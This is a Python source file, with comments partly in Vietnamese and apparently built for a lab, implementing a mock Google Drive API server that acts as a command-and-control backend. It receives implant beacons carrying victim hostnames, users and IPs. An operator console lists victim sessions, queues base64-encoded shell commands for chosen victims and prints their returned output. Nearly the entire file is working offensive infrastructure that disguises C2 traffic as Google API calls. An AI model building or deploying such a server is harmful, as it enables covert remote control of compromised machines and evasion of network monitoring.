#!/usr/bin/env python3
# =============================================================
# Mock googleapis.com — FIXED v2
# Fix 1: Lưu file theo cả name VÀ fileId param (từ implant upload)
# Fix 2: sessions hiển thị last= đúng (tính từ beacon ts field)
# Fix 3: Download file hỗ trợ trực tiếp theo filename (không cần find trước)
# =============================================================
import os, ssl, json, base64, time, threading, re, hashlib
from pathlib import Path
from flask import Flask, request, jsonify, Response
from datetime import datetime

app   = Flask(__name__)
STORE = Path("/opt/c2lab/store")
STORE.mkdir(parents=True, exist_ok=True)

CERT = "/opt/c2lab/certs/cert.pem"
KEY  = "/opt/c2lab/certs/key.pem"

import logging
logging.getLogger('werkzeug').setLevel(logging.ERROR)

def ts(): return datetime.now().strftime("%H:%M:%S")
def c(code, msg): print(f"\033[{code}m{msg}\033[0m", flush=True)
def req_log(m):    c("0;36",  f"[REQ    {ts()}] {m}")
def beacon_log(m): c("1;32",  f"[BEACON {ts()}] {m}")
def result_log(m): c("1;33",  f"[RESULT {ts()}] {m}")

# ── OAuth2 ──────────────────────────────────────────────────
@app.route('/token', methods=['POST'])
@app.route('/o/oauth2/token', methods=['POST'])
@app.route('/oauth2/v4/token', methods=['POST'])
def oauth_token():
    req_log(f"OAuth token request from {request.remote_addr}")
    return jsonify({
        "access_token":  f"ya29.mock_{hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}",
        "token_type":    "Bearer",
        "expires_in":    3600,
    })

# ── Drive Files list ─────────────────────────────────────────
@app.route('/drive/v3/files', methods=['GET'])
def files_list():
    q = request.args.get('q', '')
    m = re.search(r"name='([^']+)'", q)
    if not m:
        return jsonify({"files": [], "kind": "drive#fileList"})

    fname = m.group(1)
    fpath = STORE / fname
    req_log(f"LIST name={fname!r} exists={fpath.exists()}")

    if fpath.exists():
        return jsonify({"files": [{"id": fname, "name": fname,
                                   "mimeType": "application/json"}],
                        "kind": "drive#fileList"})
    return jsonify({"files": [], "kind": "drive#fileList"})

# ── FIX 3: Download by filename directly ────────────────────
@app.route('/drive/v3/files/<path:fid>', methods=['GET'])
def file_get(fid):
    alt   = request.args.get('alt', '')
    fpath = STORE / fid      # fid IS the filename in mock server

    if alt == 'media':
        req_log(f"DOWNLOAD {fid} exists={fpath.exists()}")
        if fpath.exists():
            return Response(fpath.read_bytes(), mimetype='application/json')
        return Response('{}', status=404, mimetype='application/json')

    # Metadata only
    return jsonify({"id": fid, "name": fid, "kind": "drive#file"})

# ── FIX 1: Upload — lưu theo name param (từ implant) ────────
@app.route('/upload/drive/v3/files', methods=['POST', 'PATCH'])
def file_upload():
    """
    Implant gửi: POST /upload/drive/v3/files?name=beacon_xxx.txt&fileId=beacon_xxx.txt
    Lưu theo 'name' param → find_file và download_json đều tìm được
    """
    # Ưu tiên fileId (set bởi implant fixed), fallback name, fallback timestamp
    fname = (request.args.get('fileId')
             or request.args.get('name')
             or f'upload_{int(time.time())}.json')

    content = request.get_data()
    fpath   = STORE / fname
    fpath.write_bytes(content)
    req_log(f"UPLOAD {fname} ({len(content)}B)")
    _handle_upload(fname, fpath)
    return jsonify({"id": fname, "name": fname}), 200

@app.route('/upload/drive/v3/files/<path:fid>', methods=['PATCH'])
def file_upload_update(fid):
    content = request.get_data()
    if content:
        (STORE / fid).write_bytes(content)
        _handle_upload(fid, STORE / fid)
    return jsonify({"id": fid}), 200

@app.route('/drive/v3/files', methods=['POST'])
def file_create():
    body  = request.get_json(force=True, silent=True) or {}
    fname = body.get('name', f'file_{int(time.time())}.json')
    content = request.get_data()
    if not content:
        content = json.dumps(body).encode()
    (STORE / fname).write_bytes(content)
    _handle_upload(fname, STORE / fname)
    return jsonify({"id": fname, "name": fname}), 200

# ── Update / Delete ──────────────────────────────────────────
@app.route('/drive/v3/files/<path:fid>', methods=['PATCH', 'DELETE'])
def file_ops(fid):
    if request.method == 'DELETE':
        fpath = STORE / fid
        if fpath.exists():
            fpath.unlink()
            req_log(f"DELETE {fid}")
        return '', 204
    content = request.get_data()
    if content:
        (STORE / fid).write_bytes(content)
        _handle_upload(fid, STORE / fid)
    return jsonify({"id": fid})

# ── Parse + log beacon / result ──────────────────────────────
def _handle_upload(fname: str, fpath: Path):
    try:
        data = json.loads(fpath.read_bytes())
    except:
        return

    if fname.startswith('beacon_'):
        vid = fname.replace('beacon_', '').replace('.txt', '')
        beacon_log(
            f"VID={vid} | host={data.get('hostname','?')} "
            f"user={data.get('user','?')} ip={data.get('ip','?')} "
            f"os={str(data.get('os','?'))[:35]}"
        )
    elif fname.startswith('result_'):
        vid = fname.replace('result_', '').replace('.json', '')
        try:
            out = base64.b64decode(data.get('output', '')).decode(errors='replace')
            rc  = data.get('rc', '?')
            result_log(f"VID={vid} rc={rc}\n{'─'*50}\n{out.strip()}\n{'─'*50}")
        except:
            result_log(f"VID={vid} (decode error)")

# ── Attacker CLI ─────────────────────────────────────────────
def attacker_cli():
    time.sleep(1.5)
    print("\n" + "═"*55)
    print("  C2 CONSOLE — Mock Google Drive C2  [FIXED v2]")
    print("═"*55)
    print("  sessions             — victims online")
    print("  cmd <vid> <command>  — gửi lệnh")
    print("  results              — xem pending results")
    print("  store                — liệt kê tất cả files trong store")
    print("  exit")
    print("═"*55 + "\n")

    while True:
        try:
            line = input("\033[1;31mC2\033[0m> ").strip()
        except (EOFError, KeyboardInterrupt):
            os._exit(0)
        if not line:
            continue

        if line == "sessions":
            beacons = sorted(STORE.glob("beacon_*.txt"))
            if not beacons:
                print("  (no active sessions)")
            for b in beacons:
                vid = b.stem.replace('beacon_', '')
                try:
                    info = json.loads(b.read_text())
                    # FIX 2: Dùng ts field từ beacon, không phải file mtime
                    beacon_ts = info.get('ts', 0)
                    age       = int(time.time()) - beacon_ts
                    age_str   = f"{age}s ago" if age < 3600 else f"{age//60}m ago"
                    print(f"  \033[1;32m[{vid}]\033[0m "
                          f"host={info.get('hostname','?'):20} "
                          f"ip={info.get('ip','?'):16} "
                          f"user={info.get('user','?'):10} "
                          f"last={age_str}")
                except Exception as e:
                    print(f"  [{vid}] parse error: {e}")

        elif line.startswith("cmd "):
            parts = line.split(maxsplit=2)
            if len(parts) < 3:
                print("  Usage: cmd <vid> <command>"); continue
            _, vid, cmd = parts
            payload = {
                "cmd":   base64.b64encode(cmd.encode()).decode(),
                "ts":    int(time.time()),
                "nonce": hashlib.md5(cmd.encode()).hexdigest()[:8]
            }
            fname = f"cmd_{vid}.json"
            (STORE / fname).write_text(json.dumps(payload))
            print(f"  \033[1;33m[→]\033[0m Queued '{cmd}' for {vid}")
            print(f"  Watching for result (up to 90s)...")

            result_file = STORE / f"result_{vid}.json"
            for i in range(30):
                time.sleep(3)
                if result_file.exists():
                    try:
                        data   = json.loads(result_file.read_text())
                        out    = base64.b64decode(data.get('output', '')).decode(errors='replace')
                        rc     = data.get('rc', '?')
                        print(f"\n  \033[1;32m[←]\033[0m rc={rc}\n{out.strip()}\n")
                        result_file.unlink()  # clean up
                    except Exception as e:
                        print(f"  [←] decode error: {e}")
                    break
                # Show progress
                if (i+1) % 5 == 0:
                    print(f"  ... still waiting ({(i+1)*3}s)", flush=True)
            else:
                print(f"\n  [!] Timeout — no response from {vid}")
                # Debug: kiểm tra cmd file còn không
                if (STORE / fname).exists():
                    print(f"  [!] cmd file vẫn còn trong store → implant chưa poll hoặc download fail")
                else:
                    print(f"  [!] cmd file đã bị xoá → implant đã nhận nhưng result chưa upload")

        elif line == "results":
            results = sorted(STORE.glob("result_*.json"))
            if not results:
                print("  (no results)")
            for r in results:
                print(f"  {r.name} ({r.stat().st_size}B)")

        elif line == "store":
            files = sorted(STORE.iterdir())
            if not files:
                print("  (empty)")
            for f in files:
                age = int(time.time()) - int(f.stat().st_mtime)
                print(f"  {f.name:40} {f.stat().st_size:6}B  {age}s ago")

        elif line == "exit":
            os._exit(0)
        else:
            print(f"  Unknown: {line!r}")

threading.Thread(target=attacker_cli, daemon=True).start()

if __name__ == '__main__':
    print(f"[*] Mock googleapis.com FIXED v2")
    print(f"[*] Store: {STORE}")

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(CERT, KEY)
    app.run(host='0.0.0.0', port=443, ssl_context=ctx,
            threaded=True, use_reloader=False)
